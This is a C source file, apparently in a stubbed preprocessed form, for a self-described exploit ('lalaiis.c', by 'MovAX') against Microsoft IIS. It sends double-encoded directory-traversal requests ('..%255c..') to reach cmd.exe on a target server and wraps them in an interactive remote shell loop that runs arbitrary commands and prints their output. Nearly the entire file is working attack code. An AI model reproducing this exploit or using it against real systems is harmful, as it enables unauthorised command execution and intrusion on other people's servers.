
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct sockaddr_in {int sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int s_addr ;
typedef int request ;
typedef int host ;
typedef int command ;


 int AF_INET ;
 int IPPROTO_TCP ;
 int PF_INET ;
 int SOCK_STREAM ;
 int alarm (int) ;
 int close (int) ;
 int connect (int,struct sockaddr*,int) ;
 int exit (int) ;
 int * fgets (char*,int,int ) ;
 int fprintf (int ,char*) ;
 struct hostent* gethostbyname (char*) ;
 int htons (int) ;
 int memcpy (char*,char*,int) ;
 int perror (char*) ;
 int printf (char*,...) ;
 scalar_t__ recv (int,char*,int,int ) ;
 int send (int,char*,int,int ) ;
 int socket (int ,int ,int ) ;
 int stderr ;
 int stdin ;
 int strcmp (char*,char*) ;
 int strlen (char*) ;
 int strncat (char*,char*,int) ;
 int strncpy (char*,char*,int) ;
 int usage () ;

int main(int argc, char **argv)
{
 int i, le_socket, le_connect_error, le_timeout ;
 int timeout=80;
 int port=80;
 char temp[1];
 char host[512]="";
 char command[1024]="";
 char request[8192]="GET /";
 struct hostent *he;
 struct sockaddr_in s_addr;

 printf(":: lalaiis.c exploit. Coded by MovAX\n");

 if (argc < 3)
    usage();

 strncpy(host, argv[1], sizeof(host));

 if(!strcmp(host, ""))
 {
  fprintf(stderr, "put a damn server\n");
  usage();
 }

 printf("\n:: Destination host > %s:%d\n", host, port);


 if((he=gethostbyname(host)) == ((void*)0))
 {
   fprintf(stderr, "put a damn VALID server\n");
  usage();
 }

for (;;)
{
    command[0]=0;
    printf("\nlala_shell> ");
    if(fgets(command, sizeof(command), stdin) == ((void*)0))
       perror("gets");
    command[strlen(command)-1]='\0';
    if(!strcmp("logout", command))
       exit(-1);

   for(i=0;i<strlen(command);i++)
   {if(command[i]==' ')
     command[i]='+';
   }

  strncpy(request, "GET /", sizeof(request));
         strncat(request, argv[2], sizeof(request) - strlen(request));
         strncat(request, "/..%255c..%255c..%255c..%255c..%255c../winnt/system32/cmd.exe?/c+", sizeof(request) - strlen(request));
   strncat(request, command, sizeof(request) - strlen(request));
  strncat(request, " HTTP/1.1\n", sizeof(request) - strlen(request));
  strncat(request, "host:" ,sizeof(request) - strlen(request));
  strncat(request, argv[1], sizeof(request) - strlen(request));
   strncat(request, "\n\n", sizeof(request) - strlen(request));

  s_addr.sin_family = AF_INET;
   s_addr.sin_port = htons(port);
   memcpy((char *) &s_addr.sin_addr, (char *) he->h_addr,
   sizeof(s_addr.sin_addr));

   if((le_socket=socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
   {
     perror("socket\n");
     exit(-1);
   }
   alarm(le_timeout);
   le_connect_error = connect(le_socket,(struct sockaddr *)&s_addr,sizeof(s_addr));
   alarm(0);

   if(le_connect_error==-1)
   {
     perror("connect");
     exit(-1);
     close(le_socket);
   }

   send(le_socket, request, strlen(request), 0);
   while(recv(le_socket,temp,1, 0)>0)
   {
            alarm(timeout);
     printf("%c", temp[0]);
            alarm(0);
   }
}
  close(le_socket);
  return 0;
}
